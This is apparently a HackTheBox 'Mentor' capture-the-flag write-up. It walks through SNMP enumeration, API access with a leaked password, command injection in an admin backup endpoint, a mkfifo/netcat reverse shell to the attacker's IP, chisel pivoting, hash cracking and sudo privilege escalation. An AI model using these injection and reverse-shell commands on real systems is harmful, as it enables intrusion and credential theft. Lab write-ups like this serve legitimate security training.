# Hackthebox - Mentor - Linux

![Hacktebox mentor](../.res/htb-mentor.png)

## Nmap

```bash
┌──(kali㉿kali)-[~]
└─$ sudo nmap -T4 -sC -sV -O -Pn -p- 10.10.11.193                   
[sudo] password for kali: 
Starting Nmap 7.93 ( https://nmap.org ) at 2022-12-25 10:50 EST
Nmap scan report for 10.10.11.193
Host is up (0.028s latency).
Not shown: 65527 closed tcp ports (reset)
PORT     STATE    SERVICE    VERSION
22/tcp   open     ssh        OpenSSH 8.9p1 Ubuntu 3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 c73bfc3cf9ceee8b4818d5d1af8ec2bb (ECDSA)
|_  256 4440084c0ecbd4f18e7eeda85c68a4f7 (ED25519)
80/tcp   open     http       Apache httpd 2.4.52
|_http-title: Did not follow redirect to http://mentorquotes.htb/
|_http-server-header: Apache/2.4.52 (Ubuntu)
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.93%E=4%D=12/25%OT=22%CT=1%CU=38011%PV=Y%DS=2%DC=I%G=Y%TM=63A874
OS:B2%P=x86_64-pc-linux-gnu)SEQ(SP=103%GCD=1%ISR=10D%TI=Z%CI=Z%II=I%TS=A)OP
OS:S(O1=M539ST11NW7%O2=M539ST11NW7%O3=M539NNT11NW7%O4=M539ST11NW7%O5=M539ST
OS:11NW7%O6=M539ST11)WIN(W1=FE88%W2=FE88%W3=FE88%W4=FE88%W5=FE88%W6=FE88)EC
OS:N(R=Y%DF=Y%T=40%W=FAF0%O=M539NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=
OS:AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(
OS:R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%
OS:F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N
OS:%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%C
OS:D=S)

Network Distance: 2 hops
Service Info: Host: mentorquotes.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 896.09 seconds
```

- We need to change `/etc/hosts` file and add this `10.10.11.193	mentorquotes.htb`

## UDP

I was kinda stuck on emumeration (I had check port 80 but did not think of subdomain enum right away) at first so I did an udp port scan with nmap `sudo nmap -T4 -sU 10.10.11.193` and got interesting results.  

> Note this taught me that it is always worth to do an udp scan as well.

- Nmap result

```bash
┌──(kali㉿kali)-[~]
└─$ sudo nmap -T4 -sU 10.10.11.193               
[sudo] password for kali: 
Starting Nmap 7.93 ( https://nmap.org ) at 2022-12-25 15:18 EST
Nmap scan report for mentorquotes.htb (10.10.11.193)
Host is up (0.029s latency).
Not shown: 936 closed udp ports (port-unreach), 63 open|filtered udp ports (no-response)
PORT    STATE SERVICE
161/udp open  snmp

Nmap done: 1 IP address (1 host up) scanned in 936.95 seconds

```

## SNMP

### Enumeration

```bash
┌──(kali㉿kali)-[~]
└─$ sudo nmap -T4 -sU 10.10.11.193 -p 161 -sC
Starting Nmap 7.93 ( https://nmap.org ) at 2022-12-25 15:22 EST
Nmap scan report for mentorquotes.htb (10.10.11.193)
Host is up (0.030s latency).

PORT    STATE SERVICE
161/udp open  snmp
| snmp-sysdescr: Linux mentor 5.15.0-56-generic #62-Ubuntu SMP Tue Nov 22 19:54:14 UTC 2022 x86_64
|_  System uptime: 4h32m34.56s (1635456 timeticks)
| snmp-info: 
|   enterprise: net-snmp
|   engineIDFormat: unknown
|   engineIDData: a124f60a99b99c6200000000
|   snmpEngineBoots: 67
|_  snmpEngineTime: 4h32m35s

Nmap done: 1 IP address (1 host up) scanned in 14.65 seconds

============================================================================

┌──(kali㉿kali)-[~]
└─$ sudo nmap -sU -p 161 --script=snmp-* 10.10.11.193
Starting Nmap 7.93 ( https://nmap.org ) at 2022-12-25 15:32 EST
Nmap scan report for mentorquotes.htb (10.10.11.193)
Host is up (0.028s latency).

PORT    STATE SERVICE
161/udp open  snmp
| snmp-sysdescr: Linux mentor 5.15.0-56-generic #62-Ubuntu SMP Tue Nov 22 19:54:14 UTC 2022 x86_64
|_  System uptime: 4h42m31.26s (1695126 timeticks)
| snmp-info: 
|   enterprise: net-snmp
|   engineIDFormat: unknown
|   engineIDData: a124f60a99b99c6200000000
|   snmpEngineBoots: 67
|_  snmpEngineTime: 4h42m30s
| snmp-brute: 
|_  public - Valid credentials

Nmap done: 1 IP address (1 host up) scanned in 16.53 seconds

============================================================================

┌──(kali㉿kali)-[~]
└─$ sudo nmap -sU -p 161 -sV 10.10.11.193                                                                                                                                                                                              130 ⨯
[sudo] password for kali: 
Starting Nmap 7.93 ( https://nmap.org ) at 2022-12-25 16:23 EST
Nmap scan report for mentorquotes.htb (10.10.11.193)
Host is up (0.034s latency).

PORT    STATE SERVICE VERSION
161/udp open  snmp    SNMPv1 server; net-snmp SNMPv3 server (public)
Service Info: Host: mentor

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 0.74 seconds
```

- `hydra -P /usr/share/seclists/Discovery/SNMP/common-snmp-community-strings.txt mentorquotes.htb snmp`
![hydra](../.res/2022-12-25-15-54-41.png)

### snmp-mibs-downloader

- `sudo apt install snmp-mibs-downloader`
- `sudo download-mibs`
- `sudo vi /etc/snmp/snmp.conf` we comment the line "mibs:"

```bash
┌──(kali㉿kali)-[~/Documents/hackthebox/Mentor]
└─$ snmpbulkwalk -c public -v2c 10.10.11.193 .
SNMPv2-MIB::sysDescr.0 = STRING: Linux mentor 5.15.0-56-generic #62-Ubuntu SMP Tue Nov 22 19:54:14 UTC 2022 x86_64
SNMPv2-MIB::sysObjectID.0 = OID: NET-SNMP-MIB::netSnmpAgentOIDs.10
DISMAN-EVENT-MIB::sysUpTimeInstance = Timeticks: (1839922) 5:06:39.22
SNMPv2-MIB::sysContact.0 = STRING: Me <admin@mentorquotes.htb>
SNMPv2-MIB::sysName.0 = STRING: mentor
SNMPv2-MIB::sysLocation.0 = STRING: Sitting on the Dock of the Bay
SNMPv2-MIB::sysServices.0 = INTEGER: 72
SNMPv2-MIB::sysORLastChange.0 = Timeticks: (1) 0:00:00.01
SNMPv2-MIB::sysORID.1 = OID: SNMP-FRAMEWORK-MIB::snmpFrameworkMIBCompliance
SNMPv2-MIB::sysORID.2 = OID: SNMP-MPD-MIB::snmpMPDCompliance
SNMPv2-MIB::sysORID.3 = OID: SNMP-USER-BASED-SM-MIB::usmMIBCompliance
SNMPv2-MIB::sysORID.4 = OID: SNMPv2-MIB::snmpMIB
SNMPv2-MIB::sysORID.5 = OID: SNMP-VIEW-BASED-ACM-MIB::vacmBasicGroup
SNMPv2-MIB::sysORID.6 = OID: TCP-MIB::tcpMIB
SNMPv2-MIB::sysORID.7 = OID: UDP-MIB::udpMIB
SNMPv2-MIB::sysORID.8 = OID: IP-MIB::ip
SNMPv2-MIB::sysORID.9 = OID: SNMP-NOTIFICATION-MIB::snmpNotifyFullCompliance
SNMPv2-MIB::sysORID.10 = OID: NOTIFICATION-LOG-MIB::notificationLogMIB
SNMPv2-MIB::sysORDescr.1 = STRING: The SNMP Management Architecture MIB.
SNMPv2-MIB::sysORDescr.2 = STRING: The MIB for Message Processing and Dispatching.
SNMPv2-MIB::sysORDescr.3 = STRING: The management information definitions for the SNMP User-based Security Model.
SNMPv2-MIB::sysORDescr.4 = STRING: The MIB module for SNMPv2 entities
SNMPv2-MIB::sysORDescr.5 = STRING: View-based Access Control Model for SNMP.
SNMPv2-MIB::sysORDescr.6 = STRING: The MIB module for managing TCP implementations
SNMPv2-MIB::sysORDescr.7 = STRING: The MIB module for managing UDP implementations
SNMPv2-MIB::sysORDescr.8 = STRING: The MIB module for managing IP and ICMP implementations
SNMPv2-MIB::sysORDescr.9 = STRING: The MIB modules for managing SNMP Notification, plus filtering.
SNMPv2-MIB::sysORDescr.10 = STRING: The MIB module for logging SNMP Notifications.
SNMPv2-MIB::sysORUpTime.1 = Timeticks: (0) 0:00:00.00
SNMPv2-MIB::sysORUpTime.2 = Timeticks: (0) 0:00:00.00
SNMPv2-MIB::sysORUpTime.3 = Timeticks: (0) 0:00:00.00
SNMPv2-MIB::sysORUpTime.4 = Timeticks: (0) 0:00:00.00
SNMPv2-MIB::sysORUpTime.5 = Timeticks: (0) 0:00:00.00
SNMPv2-MIB::sysORUpTime.6 = Timeticks: (0) 0:00:00.00
SNMPv2-MIB::sysORUpTime.7 = Timeticks: (0) 0:00:00.00
SNMPv2-MIB::sysORUpTime.8 = Timeticks: (1) 0:00:00.01
SNMPv2-MIB::sysORUpTime.9 = Timeticks: (1) 0:00:00.01
SNMPv2-MIB::sysORUpTime.10 = Timeticks: (1) 0:00:00.01
HOST-RESOURCES-MIB::hrSystemUptime.0 = Timeticks: (1841856) 5:06:58.56
HOST-RESOURCES-MIB::hrSystemDate.0 = STRING: 2022-12-25,20:56:45.0,+0:0
HOST-RESOURCES-MIB::hrSystemInitialLoadDevice.0 = INTEGER: 393216
HOST-RESOURCES-MIB::hrSystemInitialLoadParameters.0 = STRING: "BOOT_IMAGE=/vmlinuz-5.15.0-56-generic root=/dev/mapper/ubuntu--vg-ubuntu--lv ro net.ifnames=0 biosdevname=0
"
HOST-RESOURCES-MIB::hrSystemNumUsers.0 = Gauge32: 0
HOST-RESOURCES-MIB::hrSystemProcesses.0 = Gauge32: 230
HOST-RESOURCES-MIB::hrSystemMaxProcesses.0 = INTEGER: 0
HOST-RESOURCES-MIB::hrSystemMaxProcesses.0 = No more variables left in this MIB View (It is past the end of the MIB tree)

```

### snmp-check

```bash
┌──(kali㉿kali)-[~]
└─$ snmp-check -v 2c 10.10.11.193                 
snmp-check v1.9 - SNMP enumerator
Copyright (c) 2005-2015 by Matteo Cantoni (www.nothink.org)

[+] Try to connect to 10.10.11.193:161 using SNMPv2c and community 'public'

[*] System information:

  Host IP address               : 10.10.11.193
  Hostname                      : mentor
  Description                   : Linux mentor 5.15.0-56-generic #62-Ubuntu SMP Tue Nov 22 19:54:14 UTC 2022 x86_64
  Contact                       : Me <admin@mentorquotes.htb>
  Location                      : Sitting on the Dock of the Bay
  Uptime snmp                   : 05:54:18.44
  Uptime system                 : 05:53:59.18
  System date                   : 2022-12-25 21:44:05.0

[*] Network information:

  Default TTL                   : noSuchObject
  TCP segments received         : noSuchObject
  TCP segments sent             : noSuchObject
  TCP segments retrans          : noSuchObject
  Input datagrams               : noSuchObject
  Delivered datagrams           : noSuchObject
  Output datagrams              : noSuchObject

[*] File system information:

  Index                         : noSuchObject
  Mount point                   : noSuchObject
  Access                        : noSuchObject
  Bootable                      : noSuchObject

```

## HTTP

- We land on this page when visiting http://mentorquotes.htb/

![landing](../.res/2022-12-25-11-13-17.png)

- Gobuster does not give anything interesting
- Here is the http response header with some infos

```html
HTTP/1.1 200 OK
Date: Sun, 25 Dec 2022 16:57:58 GMT
Server: Werkzeug/2.0.3 Python/3.6.9
Content-Type: text/html; charset=utf-8
Vary: Accept-Encoding
Content-Length: 5506
Connection: close
```

### API

- Let's try subdomain with wfuzz `wfuzz -c -f sub-fighter -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-5000.txt -u 'http://mentorquotes.htb/' -H "HOST: FUZZ.mentorquotes.htb"`

```bash
[STRIPPED]
000000051:   404        0 L      2 W        22 Ch       "api - api" 
[STRIPPED]
```

- Here we get mainly 302 except for the api which gives us a 404. Let's add it in /etc/hosts file `10.10.11.193    mentorquotes.htb api.mentorquotes.htb`
- We can use gobuster again to find endpoints in this new subdomain. We get interesting results on our api

```bash
┌──(kali㉿kali)-[~]
└─$ gobuster dir -u http://api.mentorquotes.htb/ -w /usr/share/wordlists/SecLists/Discovery/Web-Content/big.txt
===============================================================
Gobuster v3.3
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://api.mentorquotes.htb/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/SecLists/Discovery/Web-Content/big.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.3
[+] Timeout:                 10s
===============================================================
2022/12/25 17:01:26 Starting gobuster in directory enumeration mode
===============================================================
/admin                (Status: 307) [Size: 0] [--> http://api.mentorquotes.htb/admin/]
/docs                 (Status: 200) [Size: 969]
/quotes               (Status: 307) [Size: 0] [--> http://api.mentorquotes.htb/quotes/]
/server-status        (Status: 403) [Size: 285]
/users                (Status: 307) [Size: 0] [--> http://api.mentorquotes.htb/users/]
Progress: 20456 / 20476 (99.90%)===============================================================
2022/12/25 17:04:09 Finished
===============================================================
```

- That's very cool we get the docs of the API http://api.mentorquotes.htb/docs. 
- We also have an admin endpoint that will be worth having a look at later
- We find a username `james` and their email `james@mentorquotes.htb`  
![user](../.res/2022-12-25-17-28-44.png)  
- Turns out it has a signup endpoint
![Signup](../.res/2022-12-25-17-18-14.png)  
- I created a user

```json
POST /auth/signup HTTP/1.1
Host: api.mentorquotes.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: application/json
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://api.mentorquotes.htb/docs
Content-Type: application/json
Origin: http://api.mentorquotes.htb
Content-Length: 96
Connection: close

{
  "email": "cybherbag@mentorquotes.htb",
  "username": "cybherbag",
  "password": "cybherbagpass"
}
```

- It seems like we might be able to enumerate users. Let's try this
- First we need to login to get and authorization token
![login](../.res/2022-12-25-17-22-10.png)  
- Now let's try to see info of user 1
![access denied](../.res/2022-12-25-17-24-52.png)  
- We need to be an admin. Let's see what else we can do
- I tried to bruteforce the token with hashcat but it did not go anywhere.
- I tried to tamper with it on jwt.io. It was useful to see how it is made but we do not have the key. 
- Also the [common attacks on jwt](https://portswigger.net/web-security/jwt) did not work.
- Let's try to play with the signup and see if we could signup another james user. So if we try with username and email it does not work we get a message saying that the user exists already. Using this we can check if the admin user we found when enumerating smtp exists on the api. But it does not so let's keep trying to impersonate james.
- I tried different things but nothing worked

## Back to SNMP

- Let's try to go further with SNMP, maybe we'll have more luck.
- We did not try all the possible tools or wordlists.  
- Let's use onesixtyone with [this wordlist](https://raw.githubusercontent.com/fuzzdb-project/fuzzdb/master/wordlists-misc/wordlist-common-snmp-community-strings.txt) `onesixtyone -c wordlist-common-snmp-community-strings.txt 10.10.11.193`

```bash
┌──(kali㉿kali)-[~/Documents/hackthebox/Mentor]
└─$ onesixtyone -c wordlist-common-snmp-community-strings.txt 10.10.11.193 
Scanning 1 hosts, 122 communities
10.10.11.193 [public] Linux mentor 5.15.0-56-generic #62-Ubuntu SMP Tue Nov 22 19:54:14 UTC 2022 x86_64
10.10.11.193 [public] Linux mentor 5.15.0-56-generic #62-Ubuntu SMP Tue Nov 22 19:54:14 UTC 2022 x86_64
```

- Nothing here.
- Let's try it also with nmap `sudo nmap -sU --script snmp-brute 10.10.11.193 --script-args snmp-brute.communitiesdb=wordlist-common-snmp-community-strings.txt `
- We do not get anything more than the public community.
- We can use also [this tool](https://github.com/SECFORCE/SNMP-Brute). I really recommend using a pipenv to install it
  - `sudo apt update` we update our kali
  - `sudo apt install python3-venv` we instal venv
  - `python3 -m venv snmpbrute` we create a new venv
  - `source snmpbrute/bin/activate` we launch it
  - `pip install scapy` it requires scapy to work properly
  - `python3 snmpbrute.py -t 10.10.11.193 -p 161`
- It found another community `internal`
![communities](../.res/2022-12-26-16-02-48.png)
- Once we are done with snmpbrute we can deactivate the env by typing `deactivate`
- Let's run snmpwalk, we will have to put the output in a file, because it is huge `snmpwalk -c internal 10.10.11.193 -v2c > internalenum`
- Let's see whats in the file and make a search on "STRING" it seems to output interesting infos
- We find a string that looks like a password `kj23sadkj123as0-d213`! Let's try it in our API to see if we get james this way. If it does not work on the API we will try it on ssh.  
![password](../.res/2022-12-26-16-06-35.png)
- It works, we get a token!  
![james login](../.res/2022-12-26-16-09-04.png)
- Let's try our juicy endpoints. It seems to work, we can list the users  
![users](../.res/2022-12-26-16-11-55.png)
- Apart from James we also have an svc account
- Another interesting endpoint to check is the one that is not in the docs but that gobuster found for us `/admin/`.
![admin](../.res/2022-12-26-16-14-28.png)
- When we try to access `/admin/check` it says it is not implemented yet
- When we try to access `/admin/backup` it does not accept the GET method. Let's try with a post.  
![backup](../.res/2022-12-26-16-17-04.png)
- It needs a body and we should also change the content type header to application/json. So our request in burp repeater looks like this  
![request](../.res/2022-12-26-16-25-16.png)
- We have another info when we get the response. It also need a path.  
![response](../.res/2022-12-26-16-26-06.png)
- As it wants a path let's ask it for `/etc/passwd`. It seems to work but does not output the file  
![works](../.res/2022-12-26-16-28-10.png)
- Let's try to see if it can execute commands. This is the value that we will put in path `/etc/passwd;wget http://10.10.14.5/test`
- Alse before sending the request we need to launch our python http server, this way we will see if it actually checks the file. `python3 -m http.server 80`
- Here is our request  
![request](../.res/2022-12-26-16-32-26.png)
- It does get the file!
![python server](../.res/2022-12-26-16-33-07.png)
- So now we should try to get a shell. Let's set up a listener `rlwrap nc -lvp 4444`  
- So I tried multiple payload from my pentips, [pentestmonkey](https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet) and [payloadallthethings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md)
- The only one that worked is this one (do not forget the semi colon in the end and put sh and not bash because bash will fail) `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.5 4444 >/tmp/f;`
- So we get a shell. It's root, but last time I saw this it was because I ended up in a docker container.  
![shell](../.res/2022-12-26-17-23-13.png)
- And an ls proves that we indeed are in a docker again  
![docker](../.res/2022-12-26-17-27-44.png)
- We can grab the user flag from `/home/svc/user.txt`

## Privilege Escalation

- Looking around we find different interesting files.
- The `/app/app/db.py` shows the database url `os.getenv("DATABASE_URL", "postgresql://postgres:postgres@172.22.0.1/mentorquotes_db")`
> Note that here we get connection string to the db. The username and pass are `postgres:postgres`

### Postgresql

- With a quick search we can find that default postreSQL port is 5432.
- We could try our luck there.
- We will need [chisel](https://github.com/jpillora/chisel). This tool is my favorite for when I need to tunnel or pivot. It really helped me a lot when I was working on Dante prolab. If you do not like this one there are other alternatives out there like [sshuttle](https://github.com/sshuttle/sshuttle) or [socat](https://www.kali.org/tools/socat/).
- To install chisel on your kali `curl https://i.jpillora.com/chisel! | bash`
- Then you will need to put a chisel binary in your target
- `wget https://github.com/jpillora/chisel/releases/download/v1.7.7/chisel_1.7.7_linux_amd64.gz` get it in your kali
- `gzip -d chisel_1.7.7_linux_amd64.gz` extract it
- `python3 -m http.server 80` start your python serv
- `wget http://10.10.14.5/chisel_1.7.7_linux_amd64` get it from the target
- `chmod +x chisel_1.7.7_linux_amd64` make it executable
- Now we need to launch a chisel server in our kali `sudo chisel server --port 5555 --reverse`  
![chisel server](../.res/2022-12-27-10-38-59.png)  
- `./chisel_1.7.7_linux_amd64 client -v 10.10.14.5:5555 R:5432:172.22.0.1:5432` we forward the postgresql port to be able to access it in our kali  
![chisel client](../.res/2022-12-27-10-42-11.png)  
- `psql -h 10.10.14.5 -U "postgres" -p 5432` let's try to connect to the database. If you need a refresh on postgresql [here](https://hasura.io/blog/top-psql-commands-and-flags-you-need-to-know-postgresql/) is a nice article 
- `\l` list the database  
![list db](../.res/2022-12-27-10-47-04.png)  
- `\c mentorquotes_db` we connect to the db we want
- `select * from "users";`  
![table users](../.res/2022-12-27-10-52-58.png)  
- Let's crack svc password in hashcat `hashcat -m 0 hash /usr/share/wordlists/rockyou.txt`
- We get this password `53f22d0dfa10dce7e29cd31f4f953fd8:123meunomeeivani`
- We can now connect in ssh as svc `ssh svc@10.10.11.193` which is a more convenient shell.

### linepeas

- Let's upload linepeas in our target to enumerate `wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas_linux_amd64`
- `python3 -m http.server 80`
- And in our target `wget http://10.10.14.5/linpeas_linux_amd64`
- `chmod +x linpeas_linux_amd64`
- `./linpeas_linux_amd64`
- Linepeas finds the snmpd conf file. Let's have a look
![snmp](../.res/2022-12-27-11-10-34.png)
- It contains a password! `SuperSecurePassword123__`  
![conf file](../.res/2022-12-27-11-12-14.png)

### SSH as james

- Let's try to use it for james `ssh james@10.10.11.193`
- It works!

### James' sudo rights

- Let's first try sudo -l and if it does not work let's run linepeas again
- We get something really interesting! James has sudo rights on `/bin/sh`
- Let's try `sudo /bin/sh`
- It works we have a root shell  
![root](../.res/2022-12-27-11-17-59.png)
- We can grab the flag

## Resources

- [SNMP Lab Setup and Penetration Testing - Hacking Articles](https://www.hackingarticles.in/snmp-lab-setup-and-penetration-testing/)
- [Pentesting SNMP on Hacktricks](https://book.hacktricks.xyz/network-services-pentesting/pentesting-snmp) 
- [Enumerating SNMP Servers with nmap - minimalist Ascent](https://medium.com/@minimalist.ascent/enumerating-snmp-servers-with-nmap-89aaf33bce28)
- [SNMP pentesting on infosec resources](https://resources.infosecinstitute.com/topic/snmp-pentesting/)